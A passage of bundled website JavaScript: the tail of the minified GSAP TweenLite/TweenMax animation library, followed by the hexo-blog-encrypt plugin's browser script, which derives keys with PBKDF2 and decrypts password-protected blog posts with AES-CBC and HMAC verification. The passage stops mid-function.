0):f},h.fps(t),setTimeout(function(){f&&5>h.frame&&h.useRAF(!1)},1500)}),n=h.Ticker.prototype=new h.events.EventDispatcher,n.constructor=h.Ticker;var O=g("core.Animation",function(t,e){if(this.vars=e=e||{},this._duration=this._totalDuration=t||0,this._delay=Number(e.delay)||0,this._timeScale=1,this._active=e.immediateRender===!0,this.data=e.data,this._reversed=e.reversed===!0,W){o||a.wake();var i=this.vars.useFrames?G:W;i.add(this,i._time),this.vars.paused&&this.paused(!0)}});a=O.ticker=new h.Ticker,n=O.prototype,n._dirty=n._gc=n._initted=n._paused=!1,n._totalTime=n._time=0,n._rawPrevTime=-1,n._next=n._last=n._onUpdate=n._timeline=n.timeline=null,n._paused=!1;var A=function(){o&&S()-R>2e3&&a.wake(),setTimeout(A,2e3)};A(),n.play=function(t,e){return null!=t&&this.seek(t,e),this.reversed(!1).paused(!1)},n.pause=function(t,e){return null!=t&&this.seek(t,e),this.paused(!0)},n.resume=function(t,e){return null!=t&&this.seek(t,e),this.paused(!1)},n.seek=function(t,e){return this.totalTime(Number(t),e!==!1)},n.restart=function(t,e){return this.reversed(!1).paused(!1).totalTime(t?-this._delay:0,e!==!1,!0)},n.reverse=function(t,e){return null!=t&&this.seek(t||this.totalDuration(),e),this.reversed(!0).paused(!1)},n.render=function(){},n.invalidate=function(){return this._time=this._totalTime=0,this._initted=this._gc=!1,this._rawPrevTime=-1,(this._gc||!this.timeline)&&this._enabled(!0),this},n.isActive=function(){var t,e=this._timeline,i=this._startTime;return!e||!this._gc&&!this._paused&&e.isActive()&&(t=e.rawTime())>=i&&i+this.totalDuration()/this._timeScale>t},n._enabled=function(t,e){return o||a.wake(),this._gc=!t,this._active=this.isActive(),e!==!0&&(t&&!this.timeline?this._timeline.add(this,this._startTime-this._delay):!t&&this.timeline&&this._timeline._remove(this,!0)),!1},n._kill=function(){return this._enabled(!1,!1)},n.kill=function(t,e){return this._kill(t,e),this},n._uncache=function(t){for(var e=t?this:this.timeline;e;)e._dirty=!0,e=e.timeline;return this},n._swapSelfInParams=function(t){for(var e=t.length,i=t.concat();--e>-1;)"{self}"===t[e]&&(i[e]=this);return i},n._callback=function(t){var e=this.vars;e[t].apply(e[t+"Scope"]||e.callbackScope||this,e[t+"Params"]||y)},n.eventCallback=function(t,e,i,s){if("on"===(t||"").substr(0,2)){var r=this.vars;if(1===arguments.length)return r[t];null==e?delete r[t]:(r[t]=e,r[t+"Params"]=f(i)&&-1!==i.join("").indexOf("{self}")?this._swapSelfInParams(i):i,r[t+"Scope"]=s),"onUpdate"===t&&(this._onUpdate=e)}return this},n.delay=function(t){return arguments.length?(this._timeline.smoothChildTiming&&this.startTime(this._startTime+t-this._delay),this._delay=t,this):this._delay},n.duration=function(t){return arguments.length?(this._duration=this._totalDuration=t,this._uncache(!0),this._timeline.smoothChildTiming&&this._time>0&&this._time<this._duration&&0!==t&&this.totalTime(this._totalTime*(t/this._duration),!0),this):(this._dirty=!1,this._duration)},n.totalDuration=function(t){return this._dirty=!1,arguments.length?this.duration(t):this._totalDuration},n.time=function(t,e){return arguments.length?(this._dirty&&this.totalDuration(),this.totalTime(t>this._duration?this._duration:t,e)):this._time},n.totalTime=function(t,e,i){if(o||a.wake(),!arguments.length)return this._totalTime;if(this._timeline){if(0>t&&!i&&(t+=this.totalDuration()),this._timeline.smoothChildTiming){this._dirty&&this.totalDuration();var s=this._totalDuration,r=this._timeline;if(t>s&&!i&&(t=s),this._startTime=(this._paused?this._pauseTime:r._time)-(this._reversed?s-t:t)/this._timeScale,r._dirty||this._uncache(!1),r._timeline)for(;r._timeline;)r._timeline._time!==(r._startTime+r._totalTime)/r._timeScale&&r.totalTime(r._totalTime,!0),r=r._timeline}this._gc&&this._enabled(!0,!1),(this._totalTime!==t||0===this._duration)&&(F.length&&Q(),this.render(t,e,!1),F.length&&Q())}return this},n.progress=n.totalProgress=function(t,e){var i=this.duration();return arguments.length?this.totalTime(i*t,e):i?this._time/i:this.ratio},n.startTime=function(t){return arguments.length?(t!==this._startTime&&(this._startTime=t,this.timeline&&this.timeline._sortChildren&&this.timeline.add(this,t-this._delay)),this):this._startTime},n.endTime=function(t){return this._startTime+(0!=t?this.totalDuration():this.duration())/this._timeScale},n.timeScale=function(t){if(!arguments.length)return this._timeScale;if(t=t||_,this._timeline&&this._timeline.smoothChildTiming){var e=this._pauseTime,i=e||0===e?e:this._timeline.totalTime();this._startTime=i-(i-this._startTime)*this._timeScale/t}return this._timeScale=t,this._uncache(!1)},n.reversed=function(t){return arguments.length?(t!=this._reversed&&(this._reversed=t,this.totalTime(this._timeline&&!this._timeline.smoothChildTiming?this.totalDuration()-this._totalTime:this._totalTime,!0)),this):this._reversed},n.paused=function(t){if(!arguments.length)return this._paused;var e,i,s=this._timeline;return t!=this._paused&&s&&(o||t||a.wake(),e=s.rawTime(),i=e-this._pauseTime,!t&&s.smoothChildTiming&&(this._startTime+=i,this._uncache(!1)),this._pauseTime=t?e:null,this._paused=t,this._active=this.isActive(),!t&&0!==i&&this._initted&&this.duration()&&(e=s.smoothChildTiming?this._totalTime:(e-this._startTime)/this._timeScale,this.render(e,e===this._totalTime,!0))),this._gc&&!t&&this._enabled(!0,!1),this};var C=g("core.SimpleTimeline",function(t){O.call(this,0,t),this.autoRemoveChildren=this.smoothChildTiming=!0});n=C.prototype=new O,n.constructor=C,n.kill()._gc=!1,n._first=n._last=n._recent=null,n._sortChildren=!1,n.add=n.insert=function(t,e){var i,s;if(t._startTime=Number(e||0)+t._delay,t._paused&&this!==t._timeline&&(t._pauseTime=t._startTime+(this.rawTime()-t._startTime)/t._timeScale),t.timeline&&t.timeline._remove(t,!0),t.timeline=t._timeline=this,t._gc&&t._enabled(!0,!0),i=this._last,this._sortChildren)for(s=t._startTime;i&&i._startTime>s;)i=i._prev;return i?(t._next=i._next,i._next=t):(t._next=this._first,this._first=t),t._next?t._next._prev=t:this._last=t,t._prev=i,this._recent=t,this._timeline&&this._uncache(!0),this},n._remove=function(t,e){return t.timeline===this&&(e||t._enabled(!1,!0),t._prev?t._prev._next=t._next:this._first===t&&(this._first=t._next),t._next?t._next._prev=t._prev:this._last===t&&(this._last=t._prev),t._next=t._prev=t.timeline=null,t===this._recent&&(this._recent=this._last),this._timeline&&this._uncache(!0)),this},n.render=function(t,e,i){var s,r=this._first;for(this._totalTime=this._time=this._rawPrevTime=t;r;)s=r._next,(r._active||t>=r._startTime&&!r._paused)&&(r._reversed?r.render((r._dirty?r.totalDuration():r._totalDuration)-(t-r._startTime)*r._timeScale,e,i):r.render((t-r._startTime)*r._timeScale,e,i)),r=s},n.rawTime=function(){return o||a.wake(),this._totalTime};var D=g("TweenLite",function(e,i,s){if(O.call(this,i,s),this.render=D.prototype.render,null==e)throw"Cannot tween a null target.";this.target=e="string"!=typeof e?e:D.selector(e)||e;var r,n,a,o=e.jquery||e.length&&e!==t&&e[0]&&(e[0]===t||e[0].nodeType&&e[0].style&&!e.nodeType),l=this.vars.overwrite;if(this._overwrite=l=null==l?V[D.defaultOverwrite]:"number"==typeof l?l>>0:V[l],(o||e instanceof Array||e.push&&f(e))&&"number"!=typeof e[0])for(this._targets=a=u(e),this._propLookup=[],this._siblings=[],r=0;a.length>r;r++)n=a[r],n?"string"!=typeof n?n.length&&n!==t&&n[0]&&(n[0]===t||n[0].nodeType&&n[0].style&&!n.nodeType)?(a.splice(r--,1),this._targets=a=a.concat(u(n))):(this._siblings[r]=$(n,this,!1),1===l&&this._siblings[r].length>1&&K(n,this,null,1,this._siblings[r])):(n=a[r--]=D.selector(n),"string"==typeof n&&a.splice(r+1,1)):a.splice(r--,1);else this._propLookup={},this._siblings=$(e,this,!1),1===l&&this._siblings.length>1&&K(e,this,null,1,this._siblings);(this.vars.immediateRender||0===i&&0===this._delay&&this.vars.immediateRender!==!1)&&(this._time=-_,this.render(-this._delay))},!0),M=function(e){return e&&e.length&&e!==t&&e[0]&&(e[0]===t||e[0].nodeType&&e[0].style&&!e.nodeType)},z=function(t,e){var i,s={};for(i in t)q[i]||i in e&&"transform"!==i&&"x"!==i&&"y"!==i&&"width"!==i&&"height"!==i&&"className"!==i&&"border"!==i||!(!j[i]||j[i]&&j[i]._autoCSS)||(s[i]=t[i],delete t[i]);t.css=s};n=D.prototype=new O,n.constructor=D,n.kill()._gc=!1,n.ratio=0,n._firstPT=n._targets=n._overwrittenProps=n._startAt=null,n._notifyPluginsOfEnabled=n._lazy=!1,D.version="1.18.0",D.defaultEase=n._ease=new T(null,null,1,1),D.defaultOverwrite="auto",D.ticker=a,D.autoSleep=120,D.lagSmoothing=function(t,e){a.lagSmoothing(t,e)},D.selector=t.$||t.jQuery||function(e){var i=t.$||t.jQuery;return i?(D.selector=i,i(e)):"undefined"==typeof document?e:document.querySelectorAll?document.querySelectorAll(e):document.getElementById("#"===e.charAt(0)?e.substr(1):e)};var F=[],I={},E=/(?:(-|-=|\+=)?\d*\.?\d*(?:e[\-+]?\d+)?)[0-9]/gi,N=function(t){for(var e,i=this._firstPT,s=1e-6;i;)e=i.blob?t?this.join(""):this.start:i.c*t+i.s,i.r?e=Math.round(e):s>e&&e>-s&&(e=0),i.f?i.fp?i.t[i.p](i.fp,e):i.t[i.p](e):i.t[i.p]=e,i=i._next},L=function(t,e,i,s){var r,n,a,o,l,h,_,u=[t,e],c=0,f="",p=0;for(u.start=t,i&&(i(u),t=u[0],e=u[1]),u.length=0,r=t.match(E)||[],n=e.match(E)||[],s&&(s._next=null,s.blob=1,u._firstPT=s),l=n.length,o=0;l>o;o++)_=n[o],h=e.substr(c,e.indexOf(_,c)-c),f+=h||!o?h:",",c+=h.length,p?p=(p+1)%5:"rgba("===h.substr(-5)&&(p=1),_===r[o]||o>=r.length?f+=_:(f&&(u.push(f),f=""),a=parseFloat(r[o]),u.push(a),u._firstPT={_next:u._firstPT,t:u,p:u.length-1,s:a,c:("="===_.charAt(1)?parseInt(_.charAt(0)+"1",10)*parseFloat(_.substr(2)):parseFloat(_)-a)||0,f:0,r:p&&4>p}),c+=_.length;return f+=e.substr(c),f&&u.push(f),u.setRatio=N,u},X=function(t,e,i,s,r,n,a,o){var l,h,_="get"===i?t[e]:i,u=typeof t[e],c="string"==typeof s&&"="===s.charAt(1),f={t:t,p:e,s:_,f:"function"===u,pg:0,n:r||e,r:n,pr:0,c:c?parseInt(s.charAt(0)+"1",10)*parseFloat(s.substr(2)):parseFloat(s)-_||0};return"number"!==u&&("function"===u&&"get"===i&&(h=e.indexOf("set")||"function"!=typeof t["get"+e.substr(3)]?e:"get"+e.substr(3),f.s=_=a?t[h](a):t[h]()),"string"==typeof _&&(a||isNaN(_))?(f.fp=a,l=L(_,s,o||D.defaultStringFilter,f),f={t:l,p:"setRatio",s:0,c:1,f:2,pg:0,n:r||e,pr:0}):c||(f.c=parseFloat(s)-parseFloat(_)||0)),f.c?((f._next=this._firstPT)&&(f._next._prev=f),this._firstPT=f,f):void 0},B=D._internals={isArray:f,isSelector:M,lazyTweens:F,blobDif:L},j=D._plugins={},Y=B.tweenLookup={},U=0,q=B.reservedProps={ease:1,delay:1,overwrite:1,onComplete:1,onCompleteParams:1,onCompleteScope:1,useFrames:1,runBackwards:1,startAt:1,onUpdate:1,onUpdateParams:1,onUpdateScope:1,onStart:1,onStartParams:1,onStartScope:1,onReverseComplete:1,onReverseCompleteParams:1,onReverseCompleteScope:1,onRepeat:1,onRepeatParams:1,onRepeatScope:1,easeParams:1,yoyo:1,immediateRender:1,repeat:1,repeatDelay:1,data:1,paused:1,reversed:1,autoCSS:1,lazy:1,onOverwrite:1,callbackScope:1,stringFilter:1},V={none:0,all:1,auto:2,concurrent:3,allOnStart:4,preexisting:5,"true":1,"false":0},G=O._rootFramesTimeline=new C,W=O._rootTimeline=new C,Z=30,Q=B.lazyRender=function(){var t,e=F.length;for(I={};--e>-1;)t=F[e],t&&t._lazy!==!1&&(t.render(t._lazy[0],t._lazy[1],!0),t._lazy=!1);F.length=0};W._startTime=a.time,G._startTime=a.frame,W._active=G._active=!0,setTimeout(Q,1),O._updateRoot=D.render=function(){var t,e,i;if(F.length&&Q(),W.render((a.time-W._startTime)*W._timeScale,!1,!1),G.render((a.frame-G._startTime)*G._timeScale,!1,!1),F.length&&Q(),a.frame>=Z){Z=a.frame+(parseInt(D.autoSleep,10)||120);
for(i in Y){for(e=Y[i].tweens,t=e.length;--t>-1;)e[t]._gc&&e.splice(t,1);0===e.length&&delete Y[i]}if(i=W._first,(!i||i._paused)&&D.autoSleep&&!G._first&&1===a._listeners.tick.length){for(;i&&i._paused;)i=i._next;i||a.sleep()}}},a.addEventListener("tick",O._updateRoot);var $=function(t,e,i){var s,r,n=t._gsTweenID;if(Y[n||(t._gsTweenID=n="t"+U++)]||(Y[n]={target:t,tweens:[]}),e&&(s=Y[n].tweens,s[r=s.length]=e,i))for(;--r>-1;)s[r]===e&&s.splice(r,1);return Y[n].tweens},H=function(t,e,i,s){var r,n,a=t.vars.onOverwrite;return a&&(r=a(t,e,i,s)),a=D.onOverwrite,a&&(n=a(t,e,i,s)),r!==!1&&n!==!1},K=function(t,e,i,s,r){var n,a,o,l;if(1===s||s>=4){for(l=r.length,n=0;l>n;n++)if((o=r[n])!==e)o._gc||o._kill(null,t,e)&&(a=!0);else if(5===s)break;return a}var h,u=e._startTime+_,c=[],f=0,p=0===e._duration;for(n=r.length;--n>-1;)(o=r[n])===e||o._gc||o._paused||(o._timeline!==e._timeline?(h=h||J(e,0,p),0===J(o,h,p)&&(c[f++]=o)):u>=o._startTime&&o._startTime+o.totalDuration()/o._timeScale>u&&((p||!o._initted)&&2e-10>=u-o._startTime||(c[f++]=o)));for(n=f;--n>-1;)if(o=c[n],2===s&&o._kill(i,t,e)&&(a=!0),2!==s||!o._firstPT&&o._initted){if(2!==s&&!H(o,e))continue;o._enabled(!1,!1)&&(a=!0)}return a},J=function(t,e,i){for(var s=t._timeline,r=s._timeScale,n=t._startTime;s._timeline;){if(n+=s._startTime,r*=s._timeScale,s._paused)return-100;s=s._timeline}return n/=r,n>e?n-e:i&&n===e||!t._initted&&2*_>n-e?_:(n+=t.totalDuration()/t._timeScale/r)>e+_?0:n-e-_};n._init=function(){var t,e,i,s,r,n=this.vars,a=this._overwrittenProps,o=this._duration,l=!!n.immediateRender,h=n.ease;if(n.startAt){this._startAt&&(this._startAt.render(-1,!0),this._startAt.kill()),r={};for(s in n.startAt)r[s]=n.startAt[s];if(r.overwrite=!1,r.immediateRender=!0,r.lazy=l&&n.lazy!==!1,r.startAt=r.delay=null,this._startAt=D.to(this.target,0,r),l)if(this._time>0)this._startAt=null;else if(0!==o)return}else if(n.runBackwards&&0!==o)if(this._startAt)this._startAt.render(-1,!0),this._startAt.kill(),this._startAt=null;else{0!==this._time&&(l=!1),i={};for(s in n)q[s]&&"autoCSS"!==s||(i[s]=n[s]);if(i.overwrite=0,i.data="isFromStart",i.lazy=l&&n.lazy!==!1,i.immediateRender=l,this._startAt=D.to(this.target,0,i),l){if(0===this._time)return}else this._startAt._init(),this._startAt._enabled(!1),this.vars.immediateRender&&(this._startAt=null)}if(this._ease=h=h?h instanceof T?h:"function"==typeof h?new T(h,n.easeParams):x[h]||D.defaultEase:D.defaultEase,n.easeParams instanceof Array&&h.config&&(this._ease=h.config.apply(h,n.easeParams)),this._easeType=this._ease._type,this._easePower=this._ease._power,this._firstPT=null,this._targets)for(t=this._targets.length;--t>-1;)this._initProps(this._targets[t],this._propLookup[t]={},this._siblings[t],a?a[t]:null)&&(e=!0);else e=this._initProps(this.target,this._propLookup,this._siblings,a);if(e&&D._onPluginEvent("_onInitAllProps",this),a&&(this._firstPT||"function"!=typeof this.target&&this._enabled(!1,!1)),n.runBackwards)for(i=this._firstPT;i;)i.s+=i.c,i.c=-i.c,i=i._next;this._onUpdate=n.onUpdate,this._initted=!0},n._initProps=function(e,i,s,r){var n,a,o,l,h,_;if(null==e)return!1;I[e._gsTweenID]&&Q(),this.vars.css||e.style&&e!==t&&e.nodeType&&j.css&&this.vars.autoCSS!==!1&&z(this.vars,e);for(n in this.vars)if(_=this.vars[n],q[n])_&&(_ instanceof Array||_.push&&f(_))&&-1!==_.join("").indexOf("{self}")&&(this.vars[n]=_=this._swapSelfInParams(_,this));else if(j[n]&&(l=new j[n])._onInitTween(e,this.vars[n],this)){for(this._firstPT=h={_next:this._firstPT,t:l,p:"setRatio",s:0,c:1,f:1,n:n,pg:1,pr:l._priority},a=l._overwriteProps.length;--a>-1;)i[l._overwriteProps[a]]=this._firstPT;(l._priority||l._onInitAllProps)&&(o=!0),(l._onDisable||l._onEnable)&&(this._notifyPluginsOfEnabled=!0),h._next&&(h._next._prev=h)}else i[n]=X.call(this,e,n,"get",_,n,0,null,this.vars.stringFilter);return r&&this._kill(r,e)?this._initProps(e,i,s,r):this._overwrite>1&&this._firstPT&&s.length>1&&K(e,this,i,this._overwrite,s)?(this._kill(i,e),this._initProps(e,i,s,r)):(this._firstPT&&(this.vars.lazy!==!1&&this._duration||this.vars.lazy&&!this._duration)&&(I[e._gsTweenID]=!0),o)},n.render=function(t,e,i){var s,r,n,a,o=this._time,l=this._duration,h=this._rawPrevTime;if(t>=l)this._totalTime=this._time=l,this.ratio=this._ease._calcEnd?this._ease.getRatio(1):1,this._reversed||(s=!0,r="onComplete",i=i||this._timeline.autoRemoveChildren),0===l&&(this._initted||!this.vars.lazy||i)&&(this._startTime===this._timeline._duration&&(t=0),(0===t||0>h||h===_&&"isPause"!==this.data)&&h!==t&&(i=!0,h>_&&(r="onReverseComplete")),this._rawPrevTime=a=!e||t||h===t?t:_);else if(1e-7>t)this._totalTime=this._time=0,this.ratio=this._ease._calcEnd?this._ease.getRatio(0):0,(0!==o||0===l&&h>0)&&(r="onReverseComplete",s=this._reversed),0>t&&(this._active=!1,0===l&&(this._initted||!this.vars.lazy||i)&&(h>=0&&(h!==_||"isPause"!==this.data)&&(i=!0),this._rawPrevTime=a=!e||t||h===t?t:_)),this._initted||(i=!0);else if(this._totalTime=this._time=t,this._easeType){var u=t/l,c=this._easeType,f=this._easePower;(1===c||3===c&&u>=.5)&&(u=1-u),3===c&&(u*=2),1===f?u*=u:2===f?u*=u*u:3===f?u*=u*u*u:4===f&&(u*=u*u*u*u),this.ratio=1===c?1-u:2===c?u:.5>t/l?u/2:1-u/2}else this.ratio=this._ease.getRatio(t/l);if(this._time!==o||i){if(!this._initted){if(this._init(),!this._initted||this._gc)return;if(!i&&this._firstPT&&(this.vars.lazy!==!1&&this._duration||this.vars.lazy&&!this._duration))return this._time=this._totalTime=o,this._rawPrevTime=h,F.push(this),this._lazy=[t,e],void 0;this._time&&!s?this.ratio=this._ease.getRatio(this._time/l):s&&this._ease._calcEnd&&(this.ratio=this._ease.getRatio(0===this._time?0:1))}for(this._lazy!==!1&&(this._lazy=!1),this._active||!this._paused&&this._time!==o&&t>=0&&(this._active=!0),0===o&&(this._startAt&&(t>=0?this._startAt.render(t,e,i):r||(r="_dummyGS")),this.vars.onStart&&(0!==this._time||0===l)&&(e||this._callback("onStart"))),n=this._firstPT;n;)n.f?n.t[n.p](n.c*this.ratio+n.s):n.t[n.p]=n.c*this.ratio+n.s,n=n._next;this._onUpdate&&(0>t&&this._startAt&&t!==-1e-4&&this._startAt.render(t,e,i),e||(this._time!==o||s)&&this._callback("onUpdate")),r&&(!this._gc||i)&&(0>t&&this._startAt&&!this._onUpdate&&t!==-1e-4&&this._startAt.render(t,e,i),s&&(this._timeline.autoRemoveChildren&&this._enabled(!1,!1),this._active=!1),!e&&this.vars[r]&&this._callback(r),0===l&&this._rawPrevTime===_&&a!==_&&(this._rawPrevTime=0))}},n._kill=function(t,e,i){if("all"===t&&(t=null),null==t&&(null==e||e===this.target))return this._lazy=!1,this._enabled(!1,!1);e="string"!=typeof e?e||this._targets||this.target:D.selector(e)||e;var s,r,n,a,o,l,h,_,u,c=i&&this._time&&i._startTime===this._startTime&&this._timeline===i._timeline;if((f(e)||M(e))&&"number"!=typeof e[0])for(s=e.length;--s>-1;)this._kill(t,e[s],i)&&(l=!0);else{if(this._targets){for(s=this._targets.length;--s>-1;)if(e===this._targets[s]){o=this._propLookup[s]||{},this._overwrittenProps=this._overwrittenProps||[],r=this._overwrittenProps[s]=t?this._overwrittenProps[s]||{}:"all";break}}else{if(e!==this.target)return!1;o=this._propLookup,r=this._overwrittenProps=t?this._overwrittenProps||{}:"all"}if(o){if(h=t||o,_=t!==r&&"all"!==r&&t!==o&&("object"!=typeof t||!t._tempKill),i&&(D.onOverwrite||this.vars.onOverwrite)){for(n in h)o[n]&&(u||(u=[]),u.push(n));if((u||!t)&&!H(this,i,e,u))return!1}for(n in h)(a=o[n])&&(c&&(a.f?a.t[a.p](a.s):a.t[a.p]=a.s,l=!0),a.pg&&a.t._kill(h)&&(l=!0),a.pg&&0!==a.t._overwriteProps.length||(a._prev?a._prev._next=a._next:a===this._firstPT&&(this._firstPT=a._next),a._next&&(a._next._prev=a._prev),a._next=a._prev=null),delete o[n]),_&&(r[n]=1);!this._firstPT&&this._initted&&this._enabled(!1,!1)}}return l},n.invalidate=function(){return this._notifyPluginsOfEnabled&&D._onPluginEvent("_onDisable",this),this._firstPT=this._overwrittenProps=this._startAt=this._onUpdate=null,this._notifyPluginsOfEnabled=this._active=this._lazy=!1,this._propLookup=this._targets?{}:[],O.prototype.invalidate.call(this),this.vars.immediateRender&&(this._time=-_,this.render(-this._delay)),this},n._enabled=function(t,e){if(o||a.wake(),t&&this._gc){var i,s=this._targets;if(s)for(i=s.length;--i>-1;)this._siblings[i]=$(s[i],this,!0);else this._siblings=$(this.target,this,!0)}return O.prototype._enabled.call(this,t,e),this._notifyPluginsOfEnabled&&this._firstPT?D._onPluginEvent(t?"_onEnable":"_onDisable",this):!1},D.to=function(t,e,i){return new D(t,e,i)},D.from=function(t,e,i){return i.runBackwards=!0,i.immediateRender=0!=i.immediateRender,new D(t,e,i)},D.fromTo=function(t,e,i,s){return s.startAt=i,s.immediateRender=0!=s.immediateRender&&0!=i.immediateRender,new D(t,e,s)},D.delayedCall=function(t,e,i,s,r){return new D(e,0,{delay:t,onComplete:e,onCompleteParams:i,callbackScope:s,onReverseComplete:e,onReverseCompleteParams:i,immediateRender:!1,lazy:!1,useFrames:r,overwrite:0})},D.set=function(t,e){return new D(t,0,e)},D.getTweensOf=function(t,e){if(null==t)return[];t="string"!=typeof t?t:D.selector(t)||t;var i,s,r,n;if((f(t)||M(t))&&"number"!=typeof t[0]){for(i=t.length,s=[];--i>-1;)s=s.concat(D.getTweensOf(t[i],e));for(i=s.length;--i>-1;)for(n=s[i],r=i;--r>-1;)n===s[r]&&s.splice(i,1)}else for(s=$(t).concat(),i=s.length;--i>-1;)(s[i]._gc||e&&!s[i].isActive())&&s.splice(i,1);return s},D.killTweensOf=D.killDelayedCallsTo=function(t,e,i){"object"==typeof e&&(i=e,e=!1);for(var s=D.getTweensOf(t,e),r=s.length;--r>-1;)s[r]._kill(i,t)};var te=g("plugins.TweenPlugin",function(t,e){this._overwriteProps=(t||"").split(","),this._propName=this._overwriteProps[0],this._priority=e||0,this._super=te.prototype},!0);if(n=te.prototype,te.version="1.18.0",te.API=2,n._firstPT=null,n._addTween=X,n.setRatio=N,n._kill=function(t){var e,i=this._overwriteProps,s=this._firstPT;if(null!=t[this._propName])this._overwriteProps=[];else for(e=i.length;--e>-1;)null!=t[i[e]]&&i.splice(e,1);for(;s;)null!=t[s.n]&&(s._next&&(s._next._prev=s._prev),s._prev?(s._prev._next=s._next,s._prev=null):this._firstPT===s&&(this._firstPT=s._next)),s=s._next;return!1},n._roundProps=function(t,e){for(var i=this._firstPT;i;)(t[this._propName]||null!=i.n&&t[i.n.split(this._propName+"_").join("")])&&(i.r=e),i=i._next},D._onPluginEvent=function(t,e){var i,s,r,n,a,o=e._firstPT;if("_onInitAllProps"===t){for(;o;){for(a=o._next,s=r;s&&s.pr>o.pr;)s=s._next;(o._prev=s?s._prev:n)?o._prev._next=o:r=o,(o._next=s)?s._prev=o:n=o,o=a}o=e._firstPT=r}for(;o;)o.pg&&"function"==typeof o.t[t]&&o.t[t]()&&(i=!0),o=o._next;return i},te.activate=function(t){for(var e=t.length;--e>-1;)t[e].API===te.API&&(j[(new t[e])._propName]=t[e]);return!0},d.plugin=function(t){if(!(t&&t.propName&&t.init&&t.API))throw"illegal plugin definition.";var e,i=t.propName,s=t.priority||0,r=t.overwriteProps,n={init:"_onInitTween",set:"setRatio",kill:"_kill",round:"_roundProps",initAll:"_onInitAllProps"},a=g("plugins."+i.charAt(0).toUpperCase()+i.substr(1)+"Plugin",function(){te.call(this,i,s),this._overwriteProps=r||[]},t.global===!0),o=a.prototype=new te(i);o.constructor=a,a.API=t.API;for(e in n)"function"==typeof t[e]&&(o[n[e]]=t[e]);return a.version=t.version,te.activate([a]),a},s=t._gsQueue){for(r=0;s.length>r;r++)s[r]();for(n in p)p[n].func||t.console.log("GSAP encountered missing dependency: com.greensock."+n)}o=!1}}("undefined"!=typeof module&&module.exports&&"undefined"!=typeof global?global:this||window,"TweenMax");
(() => {
  'use strict';

  const cryptoObj = window.crypto || window.msCrypto;
  const storage = window.localStorage;

  const storageName = 'hexo-blog-encrypt:#' + window.location.pathname;
  const keySalt = textToArray('hexo-blog-encrypt的作者们都是大帅比!');
  const ivSalt = textToArray('hexo-blog-encrypt是地表最强Hexo加密插件!');

  const mainElement = document.getElementById('hexo-blog-encrypt');
  const wrongPassMessage = mainElement.dataset['wpm'];
  const wrongHashMessage = mainElement.dataset['whm'];
  const dataElement = mainElement.getElementsByTagName('script')['hbeData'];
  const encryptedData = dataElement.innerText;
  const HmacDigist = dataElement.dataset['hmacdigest'];

  function hexToArray(s) {
    return new Uint8Array(s.match(/[\da-f]{2}/gi).map((h => {
      return parseInt(h, 16);
    })));
  }

  function textToArray(s) {
    var i = s.length;
    var n = 0;
    var ba = new Array()

    for (var j = 0; j < i;) {
      var c = s.codePointAt(j);
      if (c < 128) {
        ba[n++] = c;
        j++;
      } else if ((c > 127) && (c < 2048)) {
        ba[n++] = (c >> 6) | 192;
        ba[n++] = (c & 63) | 128;
        j++;
      } else if ((c > 2047) && (c < 65536)) {
        ba[n++] = (c >> 12) | 224;
        ba[n++] = ((c >> 6) & 63) | 128;
        ba[n++] = (c & 63) | 128;
        j++;
      } else {
        ba[n++] = (c >> 18) | 240;
        ba[n++] = ((c >> 12) & 63) | 128;
        ba[n++] = ((c >> 6) & 63) | 128;
        ba[n++] = (c & 63) | 128;
        j += 2;
      }
    }
    return new Uint8Array(ba);
  }

  function arrayBufferToHex(arrayBuffer) {
    if (typeof arrayBuffer !== 'object' || arrayBuffer === null || typeof arrayBuffer.byteLength !== 'number') {
      throw new TypeError('Expected input to be an ArrayBuffer')
    }

    var view = new Uint8Array(arrayBuffer)
    var result = ''
    var value

    for (var i = 0; i < view.length; i++) {
      value = view[i].toString(16)
      result += (value.length === 1 ? '0' + value : value)
    }

    return result
  }

  async function getExecutableScript(oldElem) {
    let out = document.createElement('script');
    const attList = ['type', 'text', 'src', 'crossorigin', 'defer', 'referrerpolicy'];
    attList.forEach((att) => {
      if (oldElem[att])
        out[att] = oldElem[att];
    })

    return out;
  }

  async function convertHTMLToElement(content) {
    let out = document.createElement('div');
    out.innerHTML = content;
    out.querySelectorAll('script').forEach(async (elem) => {
      elem.replaceWith(await getExecutableScript(elem));
    });

    return out;
  }

  function getKeyMaterial(password) {
    let encoder = new TextEncoder();
    return cryptoObj.subtle.importKey(
      'raw',
      encoder.encode(password),
      {
        'name': 'PBKDF2',
      },
      false,
      [
        'deriveKey',
        'deriveBits',
      ]
    );
  }

  function getHmacKey(keyMaterial) {
    return cryptoObj.subtle.deriveKey({
      'name': 'PBKDF2',
      'hash': 'SHA-256',
      'salt': keySalt.buffer,
      'iterations': 1024
    }, keyMaterial, {
      'name': 'HMAC',
      'hash': 'SHA-256',
      'length': 256,
    }, true, [
      'verify',
    ]);
  }

  function getDecryptKey(keyMaterial) {
    return cryptoObj.subtle.deriveKey({
      'name': 'PBKDF2',
      'hash': 'SHA-256',
      'salt': keySalt.buffer,
      'iterations': 1024,
    }, keyMaterial, {
      'name': 'AES-CBC',
      'length': 256,
    }, true, [
      'decrypt',
    ]);
  }

  function getIv(keyMaterial) {
    return cryptoObj.subtle.deriveBits({
      'name': 'PBKDF2',
      'hash': 'SHA-256',
      'salt': ivSalt.buffer,
      'iterations': 512,
    }, keyMaterial, 16 * 8);
  }

  async function verifyContent(key, content) {
    const encoder = new TextEncoder();
    const encoded = encoder.encode(content);

    let signature = hexToArray(HmacDigist);

    const result = await cryptoObj.subtle.verify({
      'name': 'HMAC',
      'hash': 'SHA-256',
    }, key, signature, encoded);
    console.log(`Verification result: ${result}`);
    if (!result) {
      alert(wrongHashMessage);
      console.log(`${wrongHashMessage}, got `, signature, ` but proved wrong.`);
    }
    return result;
  }

  async function decrypt(decryptKey, iv, hmacKey) {
    let typedArray = hexToArray(encryptedData);

    const result = await cryptoObj.subtle.decrypt({
      'name': 'AES-CBC',
      'iv': iv,
    }, decryptKey, typedArray.buffer).then(async (result) => {
      const decoder = new TextDecoder();
      const decoded = decoder.decode(result);

      const hideButton = document.createElement('button');
      hideButton.textContent = 'Encrypt again';
      hideButton.type = 'button';
      hideButton.classList.add("hbe-button");
      hideButton.addEventListener('click', () => {
        window.localStorage.removeItem(storageName);
        window.location.reload();
      });

      document.getElementById('hexo-blog-encrypt').style.display = 'inline';
      document.getElementById('hexo-blog-encrypt').innerHTML = '';
      document.getElementById('hexo-blog-encrypt').appendChild(await convertHTMLToElement(decoded));
      document.getElementById('hexo-blog-encrypt').appendChild(hideButton);

      // support html5 lazyload functionality.
